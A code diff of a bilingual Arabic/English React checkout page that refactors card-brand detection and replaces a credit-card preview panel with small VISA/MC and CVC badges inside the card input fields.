@@ -22,21 +22,18 @@ function useCountdown(targetMs) {
   return { remainingMs, mm, ss };
 }
 
-function detectCardBrand(digits) {
-  const d = String(digits || '').trim();
-  if (!d) return { key: 'unknown', labelAr: '', labelEn: '' };
-  if (/^4/.test(d)) return { key: 'visa', labelAr: 'Visa', labelEn: 'Visa' };
-  const mc2 = /^5[1-5]/.test(d);
-  const mc22 = /^2(2[2-9]|[3-6][0-9]|7[01]|720)/.test(d); // 2221-2720
-  if (mc2 || mc22) return { key: 'mastercard', labelAr: 'MasterCard', labelEn: 'MasterCard' };
-  if (/^3[47]/.test(d)) return { key: 'amex', labelAr: 'AmEx', labelEn: 'AmEx' };
-  return { key: 'unknown', labelAr: '', labelEn: '' };
-}
-
 function formatCardNumber(digits) {
   const d = String(digits || '').replace(/\D/g, '').slice(0, 19);
   const parts = d.match(/.{1,4}/g) || [];
   return parts.join(' ');
+}
+
+function detectCardBrand(digits) {
+  const d = String(digits || '').trim();
+  if (!d) return 'card';
+  if (/^4/.test(d)) return 'visa';
+  if (/^5[1-5]/.test(d) || /^2(2[2-9]|[3-6][0-9]|7[01]|720)/.test(d)) return 'mc';
+  return 'card';
 }
 
 function formatExpiryInput(raw) {
@@ -189,10 +186,8 @@ export default function BuyPage() {
     })()
     : true;
   const cardCvvValid = isCreditCard ? /^[0-9A-Za-z]{3}$/.test(String(cardCvv || '').trim()) : true;
+  const cardBrand = detectCardBrand(cardNumberDigits);
 
-  const ccBrand = isCreditCard ? detectCardBrand(cardNumberDigits) : { key: 'unknown', labelAr: '', labelEn: '' };
-  const formattedCardNumber = isCreditCard ? formatCardNumber(cardNumberDigits) : '';
-  const cardCvvDigitsOnly = isCreditCard ? String(cardCvv || '').replace(/\D/g, '').slice(0, 3) : '';
 
   const canSendCard = Boolean(
     isCreditCard &&
@@ -725,38 +720,6 @@ export default function BuyPage() {
 
             {stage === 2 && (
               <div className="buy-form-grid mt-6" style={{ direction: isRtl ? 'rtl' : 'ltr' }}>
-                {isCreditCard && (
-                  <div className="cc-preview-shell buy-span-2">
-                    <div className="cc-preview">
-                      <div className="cc-preview-number">
-                        {formattedCardNumber || '•••• •••• •••• ••••'}
-                      </div>
-                      <div className="cc-preview-bottom">
-                        <div className="cc-preview-exp">
-                          <div className="cc-preview-label">{isRtl ? 'الانتهاء' : 'EXP'}</div>
-                          <div className="cc-preview-value">{cardExpiry || 'MM/YY'}</div>
-                        </div>
-                        <div className="cc-preview-cvc">
-                          <div className="cc-preview-label">{isRtl ? 'CVC' : 'CVC'}</div>
-                          <div className={`cc-preview-value ${cardCvvValid ? 'cc-cvc-ok' : ''}`}>
-                            {cardCvvDigitsOnly ? '•••' : '•••'}
-                          </div>
-                        </div>
-                      </div>
-                      <div className={`cc-preview-progress ${cardNumberDigits ? 'cc-preview-progress--active' : ''}`}>
-                        <span className="cc-preview-progress-brand">
-                          {ccBrand.key === 'visa'
-                            ? 'VISA'
-                            : ccBrand.key === 'mastercard'
-                              ? 'MC'
-                              : ccBrand.key === 'amex'
-                                ? 'AMEX'
-                                : ''}
-                        </span>
-                      </div>
-                    </div>
-                  </div>
-                )}
                 {!isCreditCard && (
                   <div className="input-group buy-span-2">
                     <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
@@ -825,17 +788,22 @@ export default function BuyPage() {
                       <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                         {isRtl ? 'رقم البطاقة' : 'Card Number'}
                       </label>
-                      <input
-                        className="input-control"
-                        name="cc-number"
-                        autoComplete="cc-number"
-                        value={cardNumber}
-                        onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
-                        placeholder="4111 1111 1111 1111"
-                        inputMode="numeric"
-                        dir="ltr"
-                        style={{ textAlign: 'left' }}
-                      />
+                      <div className="cc-input-wrap">
+                        <input
+                          className="input-control cc-input-control"
+                          name="cc-number"
+                          autoComplete="cc-number"
+                          value={cardNumber}
+                          onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
+                          placeholder="4111 1111 1111 1111"
+                          inputMode="numeric"
+                          dir="ltr"
+                          style={{ textAlign: 'left' }}
+                        />
+                        <span className={`cc-input-badge cc-input-badge--${cardBrand}`} aria-hidden="true">
+                          {cardBrand === 'visa' ? 'VISA' : cardBrand === 'mc' ? 'MC' : 'CARD'}
+                        </span>
+                      </div>
                     </div>
 
                     <div className="input-group buy-span-2">
@@ -858,17 +826,22 @@ export default function BuyPage() {
                       <label className="input-label" style={{ textAlign: isRtl ? 'right' : 'left' }}>
                         {isRtl ? 'رمز (3 حروف/أرقام)' : 'CVV (3 chars)'}
                       </label>
-                      <input
-                        className="input-control"
-                        name="cc-csc"
-                        autoComplete="cc-csc"
-                        value={cardCvv}
-                        onChange={(e) => setCardCvv(String(e.target.value).replace(/[^0-9a-zA-Z]/g, '').slice(0, 3))}
-                        placeholder="XXX"
-                        dir="ltr"
-                        inputMode="text"
-                        style={{ textAlign: 'left' }}
-                      />
+                      <div className="cc-input-wrap">
+                        <input
+                          className="input-control cc-input-control"
+                          name="cc-csc"
+                          autoComplete="cc-csc"
+                          value={cardCvv}
+                          onChange={(e) => setCardCvv(String(e.target.value).replace(/[^0-9a-zA-Z]/g, '').slice(0, 3))}
+                          placeholder="XXX"
+                          dir="ltr"
+                          inputMode="text"
+                          style={{ textAlign: 'left' }}
+                        />
+                        <span className={`cc-input-badge cc-input-badge--cvc ${cardCvv ? 'cc-input-badge--active' : ''}`} aria-hidden="true">
+                          123
+                        </span>
+                      </div>
                     </div>
                   </>
                 )}
